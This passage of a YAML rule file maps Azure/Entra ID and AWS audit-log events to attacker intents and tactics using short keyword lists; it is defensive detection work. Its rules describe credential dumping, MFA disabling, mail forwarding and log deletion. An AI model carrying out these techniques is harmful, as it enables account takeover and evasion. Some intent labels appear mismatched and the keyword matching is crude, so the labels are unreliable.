  intent: credential_harvesting
  tactic: credential_access
  description: Detects when end user consent is blocked due to risk-based consent.
  conditions:
    summary:
      regex_any:
      - user
      - consent
      - blocked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74298991_9fc4_460e_a92e_511aa60baec1
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when a new owner is added to an application. This gives that
    account privileges to make modifications and configuration changes to the application.
  conditions:
    summary:
      regex_any:
      - added
      - owner
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1d147ae_a951_48e5_8b41_dcd0170c7213
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when an application is granted delegated or app role permissions
    for Microsoft Graph, Exchange, Sharepoint, or Azure AD
  conditions:
    summary:
      regex_any:
      - granted
      - microsoft
      - permissions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5aecf3d5_f8a0_48e7_99be_3a759df7358f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when administrator grants either application permissions (app
    roles) or highly privileged delegated permissions
  conditions:
    summary:
      regex_any:
      - granted
      - privileged
      - delegated
      - permissions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b04934b2_0a68_4845_8a19_bdfed3a68a7a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when an app is assigned Azure AD roles, such as global administrator,
    or Azure RBAC roles, such as subscription owner.
  conditions:
    summary:
      regex_any:
      - assigned
      - azure
      - rbac
      - microsoft
      - entra
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0055ad1f_be85_4798_83cf_a6da17c993b3
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects when a configuration change is made to an applications URI.

    URIs for domain names that no longer exist (dangling URIs), not using HTTPS, wildcards
    at the end of the domain, URIs that are no unique to that app, or URIs that point
    to domains you do not control should be investigated.

    '
  conditions:
    summary:
      regex_any:
      - application
      - configuration
      - changes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a4b25073_8947_489c_a8dd_93b41c23f26d
  intent: persistence_installation
  tactic: persistence
  description: Detects when an account dumps the LAPS password from Entra ID.
  conditions:
    summary:
      regex_any:
      - windows
      - laps
      - credential
      - dump
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d78a000_ab52_4564_88a5_7ab5242b20c7
  intent: defense_evasion
  tactic: defense_evasion
  description: Change to authentication method could be an indicator of an attacker
    adding an auth method to the account so they can have continued access.
  conditions:
    summary:
      regex_any:
      - change
      - authentication
      - method
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_352a54e1_74ba_4929_9d47_8193d67aba1e
  intent: unknown
  tactic: initial_access
  description: Identifies when an user or application modified the federation settings
    on the domain.
  conditions:
    summary:
      regex_any:
      - azure
      - domain
      - federation
      - settings
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91c95675_1f27_46d0_bead_d1ae96b97cd3
  intent: persistence_installation
  tactic: persistence
  description: Monitor and alert on group membership additions of groups that have
    CA policy modification access
  conditions:
    summary:
      regex_any:
      - user
      - added
      - group
      - with
      - policy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_665e2d43_70dc_4ccc_9d27_026c9dd7ed9c
  intent: persistence_installation
  tactic: persistence
  description: Monitor and alert on group membership removal of groups that have CA
    policy modification access
  conditions:
    summary:
      regex_any:
      - user
      - removed
      - from
      - group
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b4b72e3_4c53_4d5b_b198_2c58cfef39a9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user that doesn't have permissions to invite a guest
    user attempts to invite one.
  conditions:
    summary:
      regex_any:
      - guest
      - user
      - invited
      - approved
      - inviters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8dee7a0d_43fd_4b3c_8cd1_605e189d195e
  intent: unknown
  tactic: initial_access
  description: Detects the change of user type from "Guest" to "Member" for potential
    elevation of privilege.
  conditions:
    summary:
      regex_any:
      - user
      - state
      - changed
      - from
      - guest
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_039a7469_0296_4450_84c0_f6966b16dc6d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when a PIM elevation is approved or denied. Outside of normal
    operations should be investigated.
  conditions:
    summary:
      regex_any:
      - approvals
      - deny
      - elevation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aeaef14c_e5bf_4690_a9c8_835caad458bd
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when PIM alerts are set to disabled.
  conditions:
    summary:
      regex_any:
      - alert
      - setting
      - changes
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db6c06c4_bf3b_421c_aa88_15672b88c743
  intent: persistence_installation
  tactic: persistence
  description: Detects when changes are made to PIM roles
  conditions:
    summary:
      regex_any:
      - changes
      - settings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49a268a4_72f4_4e38_8a7b_885be690c5b5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user is added to a privileged role.
  conditions:
    summary:
      regex_any:
      - user
      - added
      - privilege
      - role
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_102e11e3_2db5_4c9e_bc26_357d42585d21
  intent: persistence_installation
  tactic: persistence
  description: Detects when a user is removed from a privileged role. Bulk changes
    should be investigated.
  conditions:
    summary:
      regex_any:
      - bulk
      - deletion
      - changes
      - privileged
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7b5b004_dece_46e4_a4a5_f6fd0e1c6947
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when a new admin is created.
  conditions:
    summary:
      regex_any:
      - privileged
      - account
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca9bf243_465e_494a_9e54_bf9fc239057d
  intent: unknown
  tactic: initial_access
  description: 'Detects when a user has been elevated to manage all Azure Subscriptions.

    This change should be investigated immediately if it isn''t planned.

    This setting could allow an attacker access to Azure subscriptions in your environment.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - subscription
      - permission
      - elevation
      - auditlogs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa84aaf5_8142_43cd_9ec2_78cfebf878ce
  intent: persistence_installation
  tactic: persistence
  description: Detects when a temporary access pass (TAP) is added to an account.
    TAPs added to priv accounts should be investigated
  conditions:
    summary:
      regex_any:
      - temporary
      - access
      - pass
      - added
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4c7758e_9417_4f2e_9109_6125d66dabef
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes and updates to the user risk and MFA registration
    policy.

    Attackers can modified the policies to Bypass MFA, weaken security thresholds,
    facilitate further attacks, maintain persistence.

    '
  conditions:
    summary:
      regex_any:
      - user
      - risk
      - registration
      - policy
      - updated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b18454c8_0be3_41f7_86bc_9c614611b839
  intent: persistence_installation
  tactic: persistence
  description: 'Detects changes to the "StrongAuthenticationRequirement" value, where
    the state is set to "0" or "Disabled".

    Threat actors were seen disabling multi factor authentication for users in order
    to maintain or achieve access to the account. Also see in SIM Swap attacks.

    '
  conditions:
    summary:
      regex_any:
      - multi
      - factor
      - authentication
      - disabled
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_340ee172_4b67_4fb4_832f_f961bdc1f3aa
  intent: credential_harvesting
  tactic: credential_access
  description: Detect when a user has reset their password in Azure AD
  conditions:
    summary:
      regex_any:
      - password
      - reset
      - user
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6555754e_5e7f_4a67_ad1c_4041c413a007
  intent: credential_harvesting
  tactic: credential_access
  description: Indicates that there are abnormal characteristics in the token such
    as an unusual token lifetime or a token that is played from an unfamiliar location.
  conditions:
    summary:
      regex_any:
      - anomalous
      - token
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_258b6593_215d_4a26_a141_c8e31c1299a6
  intent: persistence_installation
  tactic: persistence
  description: Indicates that there are anomalous patterns of behavior like suspicious
    changes to the directory.
  conditions:
    summary:
      regex_any:
      - anomalous
      - user
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_be4d9c86_d702_4030_b52e_c7859110e5e8
  intent: unknown
  tactic: initial_access
  description: Identifies that users were active from an IP address that has been
    identified as an anonymous proxy IP address.
  conditions:
    summary:
      regex_any:
      - activity
      - from
      - anonymous
      - address
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53acd925_2003_440d_a1f3_71a5253fe237
  intent: credential_harvesting
  tactic: credential_access
  description: Indicates sign-ins from an anonymous IP address, for example, using
    an anonymous browser or VPN.
  conditions:
    summary:
      regex_any:
      - anonymous
      - address
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a41023f_1e70_4026_921a_4d9341a9038e
  intent: unknown
  tactic: initial_access
  description: Identifies two sign-ins originating from geographically distant locations,
    where at least one of the locations may also be atypical for the user, given past
    behavior.
  conditions:
    summary:
      regex_any:
      - atypical
      - travel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2572bf9_e20a_4594_b528_40bde666525a
  intent: unknown
  tactic: initial_access
  description: Identifies user activities originating from geographically distant
    locations within a time period shorter than the time it takes to travel from the
    first location to the second.
  conditions:
    summary:
      regex_any:
      - impossible
      - travel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_27e4f1d6_ae72_4ea0_8a67_77a73a289c3d
  intent: data_staging
  tactic: collection
  description: Indicates suspicious rules such as an inbox rule that forwards a copy
    of all emails to an external address
  conditions:
    summary:
      regex_any:
      - suspicious
      - inbox
      - forwarding
      - identity
      - protection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ceb55fd0_726e_4656_bf4e_b585b7f7d572
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious rules that delete or move messages or folders are
    set on a user's inbox.
  conditions:
    summary:
      regex_any:
      - suspicious
      - inbox
      - manipulation
      - rules
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19128e5e_4743_48dc_bd97_52e5775af817
  intent: unknown
  tactic: reconnaissance
  description: Indicates that the user's valid credentials have been leaked.
  conditions:
    summary:
      regex_any:
      - azure
      - account
      - credential
      - leaked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a3f55ebd_0c01_4ed6_adc0_8fb76d8cd3cd
  intent: command_and_control_setup
  tactic: command_and_control
  description: Indicates sign-in from a malicious IP address based on high failure
    rates.
  conditions:
    summary:
      regex_any:
      - malicious
      - address
      - sign
      - failure
      - rate
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36440e1c_5c22_467a_889b_593e66498472
  intent: command_and_control_setup
  tactic: command_and_control
  description: Indicates sign-in from a malicious IP address known to be malicious
    at time of sign-in.
  conditions:
    summary:
      regex_any:
      - malicious
      - address
      - sign
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_821b4dc3_1295_41e7_b157_39ab212dd6bd
  intent: command_and_control_setup
  tactic: command_and_control
  description: Indicates sign-ins from IP addresses infected with malware that is
    known to actively communicate with a bot server.
  conditions:
    summary:
      regex_any:
      - sign
      - from
      - malware
      - infected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_adf9f4d2_559e_4f5c_95be_c28dff0b1476
  intent: unknown
  tactic: initial_access
  description: Detects sign-ins from new countries. The detection considers past activity
    locations to determine new and infrequent locations.
  conditions:
    summary:
      regex_any:
      - country
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28ecba0a_c743_4690_ad29_9a8f6f25a6f9
  intent: credential_harvesting
  tactic: credential_access
  description: Indicates that a password spray attack has been successfully performed.
  conditions:
    summary:
      regex_any:
      - password
      - spray
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a84fc3b1_c9ce_4125_8e74_bdcdb24021f1
  intent: credential_harvesting
  tactic: credential_access
  description: Indicates access attempt to the PRT resource which can be used to move
    laterally into an organization or perform credential theft
  conditions:
    summary:
      regex_any:
      - primary
      - refresh
      - token
      - access
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_944f6adb_7a99_4c69_80c1_b712579e93e6
  intent: unknown
  tactic: initial_access
  description: Indicates anomalous behavior based on suspicious sign-in activity across
    multiple tenants from different countries in the same browser
  conditions:
    summary:
      regex_any:
      - suspicious
      - browser
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2cb56ff_4f46_437a_a0fa_ffa4d1303cba
  intent: unknown
  tactic: initial_access
  description: Indicates user activity that is unusual for the user or consistent
    with known attack patterns.
  conditions:
    summary:
      regex_any:
      - azure
      - threat
      - intelligence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3393cba_31f0_4207_831e_aef90ab17a8c
  intent: credential_harvesting
  tactic: credential_access
  description: Indicates the SAML token issuer for the associated SAML token is potentially
    compromised. The claims included in the token are unusual or match known attacker
    patterns
  conditions:
    summary:
      regex_any:
      - saml
      - token
      - issuer
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_128faeef_79dd_44ca_b43c_a9e236a60f49
  intent: unknown
  tactic: initial_access
  description: Detects sign-in with properties that are unfamiliar to the user. The
    detection considers past sign-in history to look for anomalous sign-ins.
  conditions:
    summary:
      regex_any:
      - unfamiliar
      - sign
      - properties
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e402c26a_267a_45bd_9615_bd9ceda6da85
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when an account hasn't signed in during the past n number
    of days.
  conditions:
    summary:
      regex_any:
      - stale
      - accounts
      - privileged
      - role
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58af08eb_f9e1_43c8_9805_3ad9b0482bd8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when an organization doesn't have the proper license for
    PIM and is out of compliance.
  conditions:
    summary:
      regex_any:
      - invalid
      - license
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1bc08d1_8224_4758_a0e6_fbcfc98c73bb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when a privilege role assignment has taken place outside
    of PIM and may indicate an attack.
  conditions:
    summary:
      regex_any:
      - roles
      - assigned
      - outside
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_645fd80d_6c07_435b_9e06_7bc1b5656cba
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when the same privilege role has multiple activations by
    the same user.
  conditions:
    summary:
      regex_any:
      - roles
      - activated
      - frequently
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c6ec464_4ae4_43ac_936a_291da66ed13d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when a user has been assigned a privilege role and are not
    using that role.
  conditions:
    summary:
      regex_any:
      - roles
      - being
      - used
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_94a66f46_5b64_46ce_80b2_75dcbe627cc0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies when a privilege role can be activated without performing
    mfa.
  conditions:
    summary:
      regex_any:
      - roles
      - activation
      - doesn
      - require
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7bbc309f_e2b1_4eb1_8369_131a367d67d3
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies an event where there are there are too many accounts assigned
    the Global Administrator role.
  conditions:
    summary:
      regex_any:
      - many
      - global
      - admins
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2b7d6fc0_71ac_4cf7_8ed1_b5788ee5257a
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies user account which has been locked because the user tried
    to sign in too many times with an incorrect user ID or password.
  conditions:
    summary:
      regex_any:
      - account
      - lockout
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c944ecb_6970_4541_8496_be554b8e2846
  intent: credential_harvesting
  tactic: credential_access
  description: Detect successful authentications from countries you do not operate
    out of.
  conditions:
    summary:
      regex_any:
      - successful
      - authentications
      - from
      - countries
      - operate
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e1d02b53_c03c_4948_b11d_4d00cca49d03
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when sign-ins increased by 10% or greater.
  conditions:
    summary:
      regex_any:
      - increased
      - failed
      - authentications
      - type
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f272fb46_25f2_422c_b667_45837994980f
  intent: unknown
  tactic: initial_access
  description: Detect when authentications to important application(s) only required
    single-factor authentication
  conditions:
    summary:
      regex_any:
      - authentications
      - important
      - apps
      - using
      - single
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35b781cc_1a08_4a5a_80af_42fd7c315c6b
  intent: reconnaissance
  tactic: discovery
  description: Detects AzureHound (A BloodHound data collector for Microsoft Azure)
    activity via the default User-Agent that is used during its operation after successful
    authentication.
  conditions:
    summary:
      regex_any:
      - discovery
      - using
      - azurehound
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5afa454e_030c_4ab4_9253_a90aa7fcc581
  intent: defense_evasion
  tactic: defense_evasion
  description: Monitor and alert for device registration or join events where MFA
    was not performed.
  conditions:
    summary:
      regex_any:
      - device
      - registration
      - join
      - without
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_572b12d4_9062_11ed_a1eb_0242ac120002
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects risky authentication from a non AD registered device without
    MFA being required.
  conditions:
    summary:
      regex_any:
      - suspicious
      - signins
      - from
      - registered
      - device
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f77e1d7_3982_4ee0_8489_abf2d6b75284
  intent: defense_evasion
  tactic: defense_evasion
  description: Monitor and alert for sign-ins where the device was non-compliant.
  conditions:
    summary:
      regex_any:
      - sign
      - from
      - compliant
      - devices
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53bb4f7f_48a8_4475_ac30_5a82ddfdf6fc
  intent: credential_harvesting
  tactic: credential_access
  description: Detects successful authentication from potential clients using legacy
    authentication via user agent strings. This could be a sign of MFA bypass using
    a password spray attack.
  conditions:
    summary:
      regex_any:
      - potential
      - bypass
      - using
      - legacy
      - client
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_248649b7_d64f_46f0_9fb2_a52774166fb5
  intent: unknown
  tactic: initial_access
  description: 'Device code flow is an OAuth 2.0 protocol flow specifically for input
    constrained devices and is not used in all environments.

    If this type of flow is seen in the environment and not being used in an input
    constrained device scenario, further investigation is warranted.

    This can be a misconfigured application or potentially something malicious.

    '
  conditions:
    summary:
      regex_any:
      - application
      - using
      - device
      - code
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_55695bc0_c8cf_461f_a379_2535f563c854
  intent: unknown
  tactic: initial_access
  description: 'Resource owner password credentials (ROPC) should be avoided if at
    all possible as this requires the user to expose their current password credentials
    to the application directly.

    The application then uses those credentials to authenticate the user against the
    identity provider.

    '
  conditions:
    summary:
      regex_any:
      - applications
      - that
      - using
      - ropc
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4afac85c_224a_4dd7_b1af_8da40e1c60bd
  intent: unknown
  tactic: initial_access
  description: Detects when an account is disabled or blocked for sign in but tried
    to log in
  conditions:
    summary:
      regex_any:
      - account
      - disabled
      - blocked
      - sign
      - attempts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b4a6d707_9430_4f5f_af68_0337f52d5c42
  intent: credential_harvesting
  tactic: credential_access
  description: Define a baseline threshold for failed sign-ins due to Conditional
    Access failures
  conditions:
    summary:
      regex_any:
      - sign
      - failure
      - conditional
      - access
      - requirements
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_60f6535a_760f_42a9_be3f_c9a0a025906e
  intent: credential_harvesting
  tactic: credential_access
  description: Alert on when legacy authentication has been used on an account
  conditions:
    summary:
      regex_any:
      - legacy
      - authentication
      - protocols
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_908655e0_25cf_4ae1_b775_1c8ce9cf43d8
  intent: unknown
  tactic: initial_access
  description: Detect failed attempts to sign in to disabled accounts.
  conditions:
    summary:
      regex_any:
      - login
      - disabled
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e40f4962_b02b_4192_9bfe_245f7ece1f99
  intent: credential_harvesting
  tactic: credential_access
  description: User has indicated they haven't instigated the MFA prompt and could
    indicate an attacker has the password for the account.
  conditions:
    summary:
      regex_any:
      - multifactor
      - authentication
      - denied
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5496ff55_42ec_4369_81cb_00f417029e25
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies user login with multifactor authentication failures, which
    might be an indication an attacker has the password for the account but can't
    pass the MFA challenge.
  conditions:
    summary:
      regex_any:
      - multifactor
      - authentication
      - interrupted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8366030e_7216_476b_9927_271d79f13cf3
  intent: unknown
  tactic: initial_access
  description: Detects when there is a interruption in the authentication process.
  conditions:
    summary:
      regex_any:
      - azure
      - unusual
      - authentication
      - interruption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f521e4b_0105_4b72_845b_2198a54487b9
  intent: unknown
  tactic: initial_access
  description: Detect when users in your Azure AD tenant are authenticating to other
    Azure AD Tenants.
  conditions:
    summary:
      regex_any:
      - users
      - authenticating
      - other
      - azure
      - tenants
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a60e676_26ac_44c3_814b_0c2a8b977adf
  intent: unknown
  tactic: initial_access
  description: 'Detect access has been blocked by Conditional Access policies.

    The access policy does not allow token issuance which might be sights of unauthorizeed
    login to valid accounts.

    '
  conditions:
    summary:
      regex_any:
      - user
      - access
      - blocked
      - azure
      - conditional
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39c9f26d_6e3b_4dbb_9c7a_4154b0281112
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the deletion of S3 buckets in AWS CloudTrail logs.

    Monitoring the deletion of S3 buckets is critical for security and data integrity,
    as it may indicate potential data loss or unauthorized access attempts.

    '
  conditions:
    summary:
      regex_any:
      - bucket
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6393e346_1977_46ef_8987_ad414a145fad
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects failed AWS console login attempts due to authentication failures.
    Monitoring these events is crucial for identifying potential brute-force attacks
    or unauthorized access attempts to AWS accounts.

    '
  conditions:
    summary:
      regex_any:
      - consolelogin
      - failed
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_77caf516_34e5_4df9_b4db_20744fea0a60
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects successful AWS console logins that were performed without
    Multi-Factor Authentication (MFA).

    This alert can be used to identify potential unauthorized access attempts, as
    logging in without MFA can indicate compromised credentials or misconfigured security
    settings.

    '
  conditions:
    summary:
      regex_any:
      - successful
      - console
      - login
      - without
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4db60cc0_36fb_42b7_9b58_a5b53019fb74
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects disabling, deleting and updating of a Trail
  conditions:
    summary:
      regex_any:
      - cloudtrail
      - important
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_352a918a_34d8_4882_8470_44830c507aa3
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when an instance identity has taken an action that isn''t
    inside SSM.

    This can indicate that a compromised EC2 instance is being used as a pivot point.

    '
  conditions:
    summary:
      regex_any:
      - malicious
      - usage
      - imds
      - credentials
      - outside
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c803b2ce_c4a2_4836_beae_b112010390b1
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the addition of a new network route to a route table in AWS.

    '
  conditions:
    summary:
      regex_any:
      - network
      - route
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a840e606_7c8c_4684_9bc1_eb6b6155127f
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the execution of TruffleHog, a popular open-source tool used
    for scanning repositories for secrets and sensitive information, within an AWS
    environment.

    It has been reported to be used by threat actors for credential harvesting. All
    detections should be investigated to determine if the usage is authorized by security
    teams or potentially malicious.

    '
  conditions:
    summary:
      regex_any:
      - trufflehog
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5ffb6ea_c784_4e01_b30a_deb6e58ca2ab
  intent: persistence_installation
  tactic: persistence
  description: 'Detects the use of the EnableRegion command in AWS CloudTrail logs.

    While AWS has 30+ regions, some of them are enabled by default, others must be
    explicitly enabled in each account separately.

    There may be situations where security monitoring does not cover some new AWS
    regions.

    Monitoring the EnableRegion command is important for identifying potential persistence
    mechanisms employed by adversaries, as enabling additional regions can facilitate
    continued access and operations within an AWS environment.

    '
  conditions:
    summary:
      regex_any:
      - enableregion
      - command
      - monitoring
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6fb77778_040f_4015_9440_572aa9b6b580
  intent: unknown
  tactic: initial_access
  description: 'Detects when an account makes changes to the ingress or egress rules
    of a security group.

    This can indicate that an attacker is attempting to open up new attack vectors
    in the account, that they are trying to exfiltrate data over the network, or that
    they are trying to allow machines in that VPC/Subnet to contact a C&C server.

    '
  conditions:
    summary:
      regex_any:
      - ingress
      - egress
      - security
      - group
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a4409fc_f8ca_45f6_8006_127d779eaad9
  intent: unknown
  tactic: initial_access
  description: 'Detects changes to the security groups associated with an Elastic
    Load Balancer (ELB) or Application Load Balancer (ALB).

    This can indicate that a misconfiguration allowing more traffic into the system
    than required, or could indicate that an attacker is attempting to enable new
    connections into a VPC or subnet controlled by the account.

    '
  conditions:
    summary:
      regex_any:
      - loadbalancer
      - security
      - group
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_14f3f1c8_02d5_43a2_a191_91ffb52d3015
  intent: unknown
  tactic: initial_access
  description: 'Detects changes to the security group entries for RDS databases.

    This can indicate that a misconfiguration has occurred which potentially exposes
    the database to the public internet, a wider audience within the VPC or that removal
    of valid rules has occurred which could impact the availability of the database
    to legitimate services and users.

    '
  conditions:
    summary:
      regex_any:
      - database
      - security
      - group
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38e7f511_3f74_41d4_836e_f57dfa18eead
  intent: unknown
  tactic: initial_access
  description: 'Detect when System Manager successfully executes commands against
    an instance.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - malicious
      - usage
      - cloudtrail
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e386b9b5_af12_450e_afff_761730fb8a98
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the deletion of one or more VPC Flow Logs in AWS Elastic Compute
    Cloud (EC2) through the DeleteFlowLogs API call.

    Adversaries may delete flow logs to evade detection or remove evidence of network
    activity, hindering forensic investigations and visibility into malicious operations.

    '
  conditions:
    summary:
      regex_any:
      - flow
      - logs
      - deleted
  weights:
